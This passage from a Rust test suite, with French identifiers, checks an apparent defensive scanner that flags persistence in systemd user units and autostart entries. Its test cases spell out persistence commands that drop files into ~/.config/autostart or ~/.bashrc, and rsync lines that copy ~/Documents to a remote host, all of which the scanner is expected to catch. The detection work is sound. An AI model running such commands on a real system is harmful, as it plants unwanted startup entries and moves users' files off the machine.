            "/var/lib/snapd/desktop/systemd/user/{}.d/x.conf",
            crate::sauvegarde::SERVICE
        );
        // (nom, fichier, texte, complément posé, levée)
        let cas: &[(&str, &str, &str, Option<&str>, bool)] = &[
            ("snapd à root seul", ROOT, SNAPD, None, false),
            (
                "forme « :+ » à root seul",
                ROOT,
                "XDG_DATA_DIRS=/opt/x/share${XDG_DATA_DIRS:+:$XDG_DATA_DIRS}\n",
                None,
                false,
            ),
            (
                "snapd à root seul, complément posé",
                ROOT,
                SNAPD,
                Some(&complement),
                true,
            ),
            (
                "snapd du compte",
                ".config/environment.d/990-snapd.conf",
                SNAPD,
                None,
                true,
            ),
            (
                "snapd du système, pas à root seul",
                "/etc/environment.d/990-snapd.conf",
                SNAPD,
                None,
                true,
            ),
            (
                "autre variable",
                ROOT,
                "XDG_DATA_DIRS=${AUTRE:-/usr/share}\n",
                None,
                true,
            ),
            (
                "défaut construit",
                ROOT,
                "XDG_DATA_DIRS=${XDG_DATA_DIRS:-$TRUC/x}\n",
                None,
                true,
            ),
            (
                "défaut imbriqué",
                ROOT,
                "XDG_DATA_DIRS=${XDG_DATA_DIRS:-${TRUC}}\n",
                None,
                true,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, fichier, texte, pose, leve)) in cas.iter().enumerate() {
            for vide in [false, true] {
                let (m, _) = sauvegarde_d_essai(&format!("w4-defaut-{i}-{vide}"), vide);
                let ecrire = |f: &str, texte: &str| {
                    let p = f.strip_prefix('/').map_or_else(|| m.chemin(f), |s| m.racine.join(s));
                    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
                    std::fs::write(p, texte).unwrap();
                };
                ecrire(fichier, texte);
                if let Some(p) = pose {
                    ecrire(
                        p,
                        "[Service]\nExecStart=\nExecStart=/usr/bin/rsync -a /home/alice/Documents /tmp/x\n",
                    );
                }
                let c = m.lancements();
                let juste = if *leve {
                    c.probleme == Some(Niveau::Eleve) && crate::apprentissage::declarable(&c).is_err()
                } else {
                    (vide && c.probleme.is_none())
                        || (!vide && c.probleme == Some(Niveau::Info) && c.message.contains("avant la 0.95"))
                };
                if !juste {
                    faux.push(format!("{nom}, env -i {vide} : {:?} {:?}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "formes par défaut : {faux:#?}");
    }

    /// Point 10 (0.95) : la sauvegarde exacte levée pour ce qui la change (~/.popt, complément, variable du
    /// gestionnaire) ne se déclare toujours pas normale, mais son refus le dit et dit comment la remettre, au lieu de
    /// « ne dit pas sans ambiguïté ce qu'elle lance » sur une ligne que Vanguard a écrite.
    #[test]
    fn le_refus_de_la_sauvegarde_levee_dit_quoi_faire() {
        let complement = format!(".config/systemd/user/{}.d/x.conf", crate::sauvegarde::SERVICE);
        // (nom, fichier, texte, formes levées : 0.94, 0.95)
        let cas: &[(&str, &str, &str, &[bool])] = &[
            ("popt", ".popt", "rsync alias --x -a\n", &[false, true]),
            (
                "complément",
                complement.as_str(),
                "[Service]\nEnvironment=X=1\n",
                &[false, true],
            ),
            (
                "environment.d",
                ".config/environment.d/50-x.conf",
                "HOME=/home/alice/.cache/x\n",
                &[false],
            ),
        ];
        let mut faux = Vec::new();
        for (nom, chemin, texte, formes) in cas {
            for &vide in *formes {
                let (m, service) = sauvegarde_d_essai(&format!("sauvegarde-refus-{nom}-{vide}"), vide);
                m.ecrire(chemin, texte);
                let c = m.lancements();
                let r = match c.temoins() {
                    crate::machine::temoins::Temoins::Refuse(r) => r.clone(),
                    autre => format!("{autre:?}"),
                };
                // Le refus nomme une ligne Exec… du service (numérotée à partir de 1) et redit la raison de l'alerte.
                let nommee = service.lines().enumerate().any(|(n, l)| {
                    l.starts_with("Exec")
                        && r.starts_with(&format!(
                            "~/.config/systemd/user/{}:{} : ",
                            crate::sauvegarde::SERVICE,
                            n + 1
                        ))
                });
                let raison = r
                    .split_once("ce qu'elle lance (")
                    .and_then(|(_, reste)| reste.split_once("). Gardez"))
                    .is_some_and(|(raison, _)| !raison.is_empty() && c.message.contains(raison));
                let juste = c.probleme == Some(Niveau::Eleve)
                    && crate::apprentissage::declarable(&c).is_err()
                    && nommee
                    && raison
                    && r.contains("sauvegarde de Vanguard")
                    && r.contains("« vanguard sauvegarde-auto --annuler »")
                    && r.contains("« vanguard sauvegarde-auto »")
                    && !r.contains("sans ambiguïté")
                    && !r.contains("retirez la ligne")
                    // V-5 (relecture 0.95) : retirer une seule ligne du ~/.popt ne la tait pas, et la remettre en
                    // place n'aide que pour une variable sur une sauvegarde d'avant la 0.95.
                    && r.contains("~/.popt en entier")
                    && !r.contains("sa ligne « exec »")
                    && r.contains("posée avant la 0.95");
                if !juste {
                    faux.push((*nom, vide, c.probleme, r));
                }
            }
        }
        assert!(faux.is_empty(), "refus de la sauvegarde levée : {faux:#?}");
    }

    /// D-1, les morceaux : les fichiers de popt du système ne se taisent jamais (tous à root seul : une information ;
    /// un seul qui ne l'est pas : levé) ; le point de montage de /proc/self/mountinfo se lit avec ses « \\040 ».
    #[test]
    fn les_popt_du_systeme_et_les_points_de_montage_se_lisent() {
        use permise::Ecart;
        assert_eq!(permise::popt_du_systeme(&[]), Ok(None));
        assert_eq!(
            permise::popt_du_systeme(&[true, true]),
            Ok(Some(Ecart::PoptDuSystemeARoot))
        );
        assert_eq!(permise::popt_du_systeme(&[true, false]), Err(Ecart::PoptDuSysteme));
        assert!(Ecart::PoptDuSystemeARoot.information() && Ecart::DisqueDebranche.information());
        assert!(!Ecart::PoptDuSysteme.information() && !Ecart::DestinationNonVue.information());
        let l = "36 25 8:17 / /run/media/alice/Mon\\040disque\\134x rw shared:1 - vfat /dev/sdb1 rw";
        assert_eq!(
            permise::point_de_montage(l).as_deref(),
            Some("/run/media/alice/Mon disque\\x")
        );
        assert_eq!(permise::point_de_montage("36 25 8:17 /"), None);
        assert_eq!(permise::point_de_montage("1 2 3 4 /a\\04"), None);
    }

    /// COMP-3, la forme exacte : un pourcentage de ressource (chiffres, décimale facultative, « % ») se lit ; toute
    /// autre valeur à « % » d'une clé de ressource reste non lue. Hors de l'unité de la sauvegarde, rsync reste un
    /// lanceur à toutes ses formes, celles de la sauvegarde comprises (S-1 : seule l'unité exacte se tait, et sans
    /// réglages de popt, `la_sauvegarde_exacte_ne_se_tait_que_sans_reglages_de_popt`).
    #[test]
    fn un_pourcentage_de_ressource_se_lit_et_rsync_reste_un_lanceur() {
        use std::os::unix::fs::PermissionsExt as _;
        let cas: &[(&str, &str, bool)] = &[
            ("CPUQuota=20%", "/usr/bin/true", true),
            ("CPUQuota=12.5%", "/usr/bin/true", true),
            ("MemoryMax=80%", "/usr/bin/true", true),
            ("TasksMax=15%", "/usr/bin/true", true),
            ("ManagedOOMMemoryPressureLimit=60%", "/usr/bin/true", true),
            ("MemoryMax=256M", "/usr/bin/true", true),
            ("CPUQuota=%h", "/usr/bin/true", false),
            ("CPUQuota=20%%", "/usr/bin/true", false),
            ("CPUQuota=%20", "/usr/bin/true", false),
            ("CPUQuota=20%h", "/usr/bin/true", false),
            ("CPUQuota=.5%", "/usr/bin/true", false),
            ("CPUQuota=5.%", "/usr/bin/true", false),
            ("CPUQuota=-5%", "/usr/bin/true", false),
            ("MemoryMax=%t/x%", "/usr/bin/true", false),
            // S-1 (relecture 0.94) : aucune règle générale sur rsync. L'unité hostile du rapport, et la même copie
            // aux options exactes de la sauvegarde, restent des lanceurs.
            (
                "Nice=10",
                "/usr/bin/rsync -a /home/alice/Documents/charge/ /home/alice/.config/autostart/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a /home/alice/Documents/charge/ /home/alice/.config/systemd/user/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --no-specials --no-devices --exclude=.cache --exclude=node_modules --exclude=.vanguard-copie-en-cours /home/alice/Documents /run/media/alice/Cle/Sauvegarde-Vanguard/pc/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -rt --modify-window=2 /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a -e ssh /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --rsh=ssh /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --rsync-path=/tmp/x /home/alice/Documents /mnt/x/",
                false,
            ),
            ("Nice=10", "/usr/bin/rsync -a /home/alice/Documents hote:/x/", false),
            (
                "Nice=10",
                "/usr/bin/rsync -a --filter=merge_/x /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --modify-window=x /home/alice/Documents /mnt/x/",
                false,
            ),
        ];
        for (i, (ligne, exec, sain)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("pourcentage-{i}"));
            for p in ["usr/bin/true", "usr/bin/rsync"] {
                let f = m.racine.join(p);
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(&f, "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            m.ecrire(
                ".config/systemd/user/essai.service",
                &format!("[Unit]\nDescription=essai\n\n[Service]\nExecStart={exec}\n{ligne}\n\n[Install]\nWantedBy=default.target\n"),
            );
            let constats = persistance_dans(
                &m.racine,
                &m.chemin(""),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            );
            let leve: Vec<_> = constats
                .iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| &c.message)
                .collect();
            assert_eq!(leve.is_empty(), *sain, "{ligne} / {exec} : {leve:?}");
        }
    }

    /// Point 11 (0.95) : « AmbientCapabilities= » vide (la forme des unités de Vanguard : garde, isolement) ne fait
    /// que vider les droits ambiants, il se lit ; toute autre valeur en donne (ou « ~… » : tous sauf) et reste levée,
    /// au bilan comme pour `vanguard demarrage` (`complement_change_le_lancement`).
    #[test]
    fn droits_ambiants_lus_seulement_vides() {
        use std::os::unix::fs::PermissionsExt as _;
        let cas: &[(&str, bool)] = &[
            ("AmbientCapabilities=", true),
            ("AmbientCapabilities= \t", true),
            ("CapabilityBoundingSet=CAP_NET_ADMIN", true),
            ("AmbientCapabilities=CAP_NET_ADMIN", false),
            ("AmbientCapabilities=~CAP_SYS_ADMIN", false),
            ("AmbientCapabilities=~", false),
            ("AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_NET_RAW", false),
            ("AmbientCapabilities=%h", false),
            ("AmbientCapabilities=\"\"", false),
        ];
        let mut faux = Vec::new();
        for (i, (ligne, sain)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("ambiants-{i}"));
            let f = m.racine.join("usr/bin/true");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            m.ecrire(
                ".config/systemd/user/essai.service",
                &format!("[Unit]\nDescription=essai\n\n[Service]\nExecStart=/usr/bin/true\n{ligne}\n\n[Install]\nWantedBy=default.target\n"),
            );
            let constats = persistance_dans(
                &m.racine,
                &m.chemin(""),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            );
            let leve = constats.iter().any(|c| c.probleme.is_some());
            let change = !complement_change_le_lancement(&format!("[Service]\n{ligne}\n"), &m.chemin("")).is_empty();
            if leve == *sain || change == *sain {
                faux.push((*ligne, leve, change));
            }
        }
        assert!(faux.is_empty(), "(ligne, levée, changement dit) : {faux:#?}");
    }

    /// Point 12 (0.95) : une ligne qui nomme un lieu de démarrage du compte en argument (« cp -r … ~/.config/autostart »,
    /// cp -a, cp -R, mv, install, ln, -t, --target-directory=, %h, ~/.config seul, ~/.bashrc) peut y poser un
    /// lancement à chaque passage : levée. Le témoin (une copie entre deux dossiers ordinaires, ~/.config/omarchy
    /// lu par une ligne) reste muet.
    #[test]
    fn une_ligne_qui_nomme_un_lieu_de_demarrage_est_levee() {
        use std::os::unix::fs::PermissionsExt as _;
        let cas: &[(&str, bool)] = &[
            ("/usr/bin/cp -r /home/alice/Documents/a /home/alice/Documents/b", true),
            (
                "/usr/bin/cp /home/alice/.config/omarchy/current/background /home/alice/Documents/b",
                true,
            ),
            // Un nom qui commence seulement comme un lieu (« autostart-anciens », « hyprpaper ») n'en est pas un.
            (
                "/usr/bin/cp -r /home/alice/Documents/a /home/alice/.config/autostart-anciens",
                true,
            ),
            (
                "/usr/bin/cp -r /home/alice/Documents/t /home/alice/.config/hyprpaper/fonds",
                true,
            ),
            (
                "/usr/bin/cp -r /home/alice/Documents/charge /home/alice/.config/autostart",
                false,
            ),
            (
                "/usr/bin/cp -R /home/alice/Documents/x.desktop /home/alice/.config/autostart/",
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x.desktop /home/alice/.config/autostart/x.desktop",
                false,
            ),
            (
                "/usr/bin/cp -t /home/alice/.config/autostart /home/alice/Documents/x.desktop",
                false,
            ),
            (
                "/usr/bin/cp --target-directory=/home/alice/.config/autostart /home/alice/Documents/x",
                false,
            ),
            ("/usr/bin/cp -r %h/Documents/charge %h/.config/autostart", false),
            (
                "/usr/bin/cp -r /home/alice/Documents/u /home/alice/.config/systemd/user/",
                false,
            ),
            (
                "/usr/bin/cp -r /home/alice/Documents/u /home/alice/.local/share/systemd/user",
                false,
            ),
            ("/usr/bin/cp -r /home/alice/Documents/c /home/alice/.config", false),
            ("/usr/bin/cp -r /home/alice/Documents/c /home/alice/.config/", false),
            ("/usr/bin/cp /home/alice/Documents/b /home/alice/.bashrc", false),
            (
                "/usr/bin/cp /home/alice/Documents/h /home/alice/.config/hypr/hyprland.conf",
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/e /home/alice/.config/environment.d/x.conf",
                false,
            ),
            ("/usr/bin/cp /home/alice/Documents/p /home/alice/.popt", false),
            (
                "/usr/bin/cp /home/alice/Documents/b /home/bob/.config/autostart/x.desktop",
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/b /home/alice/Documents/../.config/autostart/x.desktop",
                false,
            ),
            (
                "/usr/bin/mv /home/alice/Documents/x.desktop /home/alice/.config/autostart/",
                false,
            ),
            (
                "/usr/bin/install -D /home/alice/Documents/x /home/alice/.config/autostart/x.desktop",
                false,
            ),
            (
                "/usr/bin/ln -s /home/alice/Documents/x.desktop /home/alice/.config/autostart/x.desktop",
                false,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (exec, sain)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("lieu-de-demarrage-{i}"));
            for p in ["usr/bin/cp", "usr/bin/mv", "usr/bin/install", "usr/bin/ln"] {
                let f = m.racine.join(p);
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(&f, "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            m.ecrire(
                ".config/systemd/user/essai.service",
                &format!("[Unit]\nDescription=essai\n\n[Service]\nExecStart={exec}\nNice=10\n\n[Install]\nWantedBy=default.target\n"),
            );
            let constats = persistance_dans(
                &m.racine,
                &m.chemin(""),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            );
            let leve: Vec<_> = constats
                .iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message.clone())
                .collect();
            // ~/.bashrc et ~/.popt étaient déjà levés par le filet (un « .x » de la maison) : sa raison passe d'abord.
            let juste = if *sain {
                leve.is_empty()
            } else {
                leve.iter()
                    .any(|l| l.contains("lieu de démarrage du compte") || l.contains("dossier temporaire ou caché"))
            };
            if !juste {
                faux.push((*exec, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// W-3 (relecture 0.95) : le contrôle du point 12 lisait le texte de l'argument, pas l'endroit où il mène. Une
    /// destination qui est un lien du compte vers un lieu de démarrage (absolu, relatif, pendant, en chaîne), un
    /// chemin relatif lu depuis le dossier courant d'une unité du compte (WorkingDirectory=%h), « %E/… », ou un lieu
    /// d'un autre bureau (autostart-scripts de KDE, Sway, niri) : levée. Une boucle de liens : non vérifiée, levée.
    /// Les témoins (un lien vers un dossier ordinaire, un relatif ordinaire) restent muets.
    #[test]
    fn un_lien_un_relatif_ou_un_autre_bureau_mene_au_lieu_de_demarrage() {
        use std::os::unix::fs::PermissionsExt as _;
        type Cas<'a> = (&'a str, &'a [(&'a str, &'a str)], bool);
        let cas: &[Cas<'_>] = &[
            (
                "/usr/bin/cp /home/alice/Documents/x.desktop /home/alice/Documents/lien/",
                &[("Documents/lien", "/home/alice/.config/autostart")],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x %h/Documents/lien/x.desktop",
                &[("Documents/lien", "../.config/autostart")],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/f.desktop",
                &[("Documents/f.desktop", "/home/alice/.config/autostart/f.desktop")],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/a/x.desktop",
                &[("Documents/a", "b"), ("Documents/b", "/home/alice/.config/autostart")],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x Documents/../.config/autostart/x.desktop",
                &[],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                &[("lien", ".config/autostart")],
                false,
            ),
            ("/usr/bin/cp -r /home/alice/Documents/x %E/autostart", &[], false),
            ("/usr/bin/cp /home/alice/Documents/s %h/.config/sway/config", &[], false),
            (
                "/usr/bin/cp /home/alice/Documents/s /home/alice/.config/niri/config.kdl",
                &[],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/s /home/alice/.config/autostart-scripts/s.sh",
                &[],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/b1/x",
                &[("Documents/b1", "b2"), ("Documents/b2", "b1")],
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/lien/",
                &[("Documents/lien", "/home/alice/Documents/autre")],
                true,
            ),
            ("/usr/bin/cp /home/alice/Documents/x Documents/b", &[], true),
            (
                "/usr/bin/cp -r /home/alice/Documents/a /home/alice/Documents/b",
                &[],
                true,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (exec, liens, sain)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("lieu-reel-{i}"));
            let f = m.racine.join("usr/bin/cp");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            for d in [".config/autostart", "Documents/autre"] {
                std::fs::create_dir_all(m.chemin(d)).unwrap();
            }
            for (lien, cible) in *liens {
                // Une cible absolue se lit sous la racine de l'essai, comme le fait le bilan.
                std::os::unix::fs::symlink(cible, m.chemin(lien)).unwrap();
            }
            m.ecrire(
                ".config/systemd/user/essai.service",
                &format!("[Unit]\nDescription=essai\n\n[Service]\nWorkingDirectory=%h\nExecStart={exec}\nNice=10\n\n[Install]\nWantedBy=default.target\n"),
            );
            let constats = persistance_dans(
                &m.racine,
                &m.chemin(""),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            );
            let leve: Vec<_> = constats
                .iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message.clone())
                .collect();
            let juste = if *sain {
                leve.is_empty()
            } else {
                leve.iter().any(|l| l.contains("lieu de démarrage du compte"))
            };
            if !juste {
                faux.push((*exec, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// X-3, X-4 (relecture 0.95) : un argument qui mène à un lieu de démarrage du compte par un nom de dossier à
    /// séparateur (« , », « = », « : », une espace entre guillemets), depuis le dossier courant de la ligne
    /// (WorkingDirectory=, Path= d'une entrée de bureau), par /proc/self/cwd, par un lien physique, par un dossier
    /// personnel atteint par un lien, ou par un dossier illisible : levé. Les témoins (un relatif ordinaire depuis
    /// WorkingDirectory=, « .config » sous WorkingDirectory=/, /proc/cpuinfo) restent muets.
    #[test]
    fn un_chemin_qui_ne_se_suit_pas_avec_certitude_mene_au_lieu_de_demarrage() {
        use std::os::unix::fs::PermissionsExt as _;
        /// Ce qui se prépare en plus : rien, un lien physique, un dossier personnel atteint par un lien, un dossier
        /// illisible, une entrée de bureau à la place de l'unité.
        #[derive(Clone, Copy, PartialEq)]
        enum Prep {
            Rien,
            Physique,
            MaisonLiee,
            Illisible,
            Bureau,
            AjoutDifferent,
            ProcSimule,
            PhysiqueOrdinaire,
            PhysiqueBashrc,
            PhysiqueBashrcLie,
            PhysiqueLienDansLieu,
            PhysiqueTrop,
            PhysiqueProfond,
            PhysiqueIllisible,
            PhysiqueSansTraverse,
            PhysiqueLieuLie,
            PhysiqueSousDossierLie,
            PhysiqueBoucle,
            PhysiqueCibleIllisible,
            PhysiqueLieuAbsolu,
        }
        type Cas<'a> = (&'a str, &'a str, &'a [(&'a str, &'a str)], Prep, bool);
        let autostart: &[(&str, &str)] = &[("Documents/lien", "/home/alice/.config/autostart")];
        let separateurs = format!(
            "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/{}",
            "a,".repeat(40)
        );
        let cas: &[Cas<'_>] = &[
            (separateurs.as_str(), "", &[], Prep::Rien, false),
            // Y-2 (revérification 4) : /proc/self, /proc/thread-self, /proc/<nombre> dépendent du processus qui lit
            // (ici un /proc simulé où le dossier courant du lecteur est /srv, pas la maison).
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/p/x.desktop",
                "",
                &[("Documents/p", "/proc/self/./cwd/.config/autostart")],
                Prep::ProcSimule,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/p/x.desktop",
                "",
                &[("Documents/p", "/proc/self//cwd/.config/autostart")],
                Prep::ProcSimule,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/p/x.desktop",
                "",
                &[("Documents/p", "/proc/self/task/../cwd/.config/autostart")],
                Prep::ProcSimule,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/p/x.desktop",
                "",
                &[("Documents/p", "/proc/4242/cwd/.config/autostart")],
                Prep::ProcSimule,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/p/x.desktop",
                "",
                &[("Documents/p", "/proc/thread-self/cwd/.config/autostart")],
                Prep::ProcSimule,
                false,
            ),
            (
                "/usr/bin/cp /proc/cpuinfo /home/alice/Documents/b",
                "",
                &[],
                Prep::ProcSimule,
                true,
            ),
            // Y-3 (revérification 4) : un fichier à deux noms se juge par ses noms dans les lieux de démarrage. Un
            // deuxième nom ordinaire (F13) se tait ; un nom sous ~/.bashrc (même suivi par un lien) ou désigné par un
            // lien d'un lieu lève ; des lieux trop grands ou trop profonds pour être lus en entier lèvent (non
            // vérifié).
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueOrdinaire,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/h.sh",
                "",
                &[],
                Prep::PhysiqueBashrc,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/h.sh",
                "",
                &[],
                Prep::PhysiqueBashrcLie,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/h.sh",
                "",
                &[],
                Prep::PhysiqueLienDansLieu,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueTrop,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueProfond,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueIllisible,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueSansTraverse,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/h.sh",
                "",
                &[],
                Prep::PhysiqueLieuLie,
                false,
            ),
            // Z-2, Z-3 (revérification 5) : un sous-dossier d'un lieu lié ailleurs se lit (G2) ; une boucle de liens
            // se lit une fois et se tait ; une cible illisible, ou un lien absolu sous une racine d'essai : levé.
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/h.sh",
                "",
                &[],
                Prep::PhysiqueSousDossierLie,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueBoucle,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueCibleIllisible,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/notes.txt /home/alice/Documents/b",
                "",
                &[],
                Prep::PhysiqueLieuAbsolu,
                false,
            ),
            // Le même passage sous une racine sans /proc : il se juge sur le chemin net, sans rien lire.
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/p/x.desktop",
                "",
                &[("Documents/p", "/proc/sys/.././self/cwd/.config/autostart")],
                Prep::Rien,
                false,
            ),
            // Y-1 (revérification 4) : un dossier courant que systemd ignore (non normalisé, pas absolu, code
            // inconnu) laisse le dossier personnel ; Vanguard ne doit pas en croire un autre.
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "-/x/../y",
                &[],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "--/x",
                &[],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "-%h/Documents/../Documents",
                &[],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "/home/%u/Documents",
                autostart,
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "/x/../y",
                &[],
                Prep::Bureau,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "-/x",
                &[],
                Prep::Bureau,
                false,
            ),
            // A-1 (revérification 6) : B10, B11, B12 ; tout Path= devient « WorkingDirectory=-… » (mesuré).
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/y.desktop",
                "/nexistepas",
                &[],
                Prep::Bureau,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x home/alice/.config/autostart/y.desktop",
                "/nexistepas",
                &[],
                Prep::Bureau,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/y",
                "/nexistepas",
                &[],
                Prep::Bureau,
                true,
            ),
            // « Path= » vide (blancs) : le générateur écrit « WorkingDirectory=- » (mesuré), le dossier personnel.
            (
                "/usr/bin/cp /home/alice/Documents/x Documents/y",
                " ",
                &[],
                Prep::Bureau,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "%h/Documents",
                autostart,
                Prep::AjoutDifferent,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/a,b/x.desktop",
                "",
                &[("Documents/a,b", "/home/alice/.config/autostart")],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/a=b/x.desktop",
                "",
                &[("Documents/a=b", "/home/alice/.config/autostart")],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/a:b/x.desktop",
                "",
                &[("Documents/a:b", "/home/alice/.config/autostart")],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x \"/home/alice/Documents/a b/x.desktop\"",
                "",
                &[("Documents/a b", "/home/alice/.config/autostart")],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "%h/Documents",
                autostart,
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "/home/alice/Documents",
                autostart,
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "-%h/Documents",
                autostart,
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "%h/${X}",
                autostart,
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/p/x.desktop",
                "",
                &[("Documents/p", "/proc/self/cwd/.config/autostart")],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/h.desktop",
                "",
                &[],
                Prep::Physique,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /data/alice/.config/autostart/x.desktop",
                "",
                &[],
                Prep::MaisonLiee,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/ferme/lien/x.desktop",
                "",
                &[],
                Prep::Illisible,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "/home/alice/Documents",
                autostart,
                Prep::Bureau,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x lien/x.desktop",
                "",
                autostart,
                Prep::Bureau,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x b",
                "%h/Documents",
                &[],
                Prep::Rien,
                true,
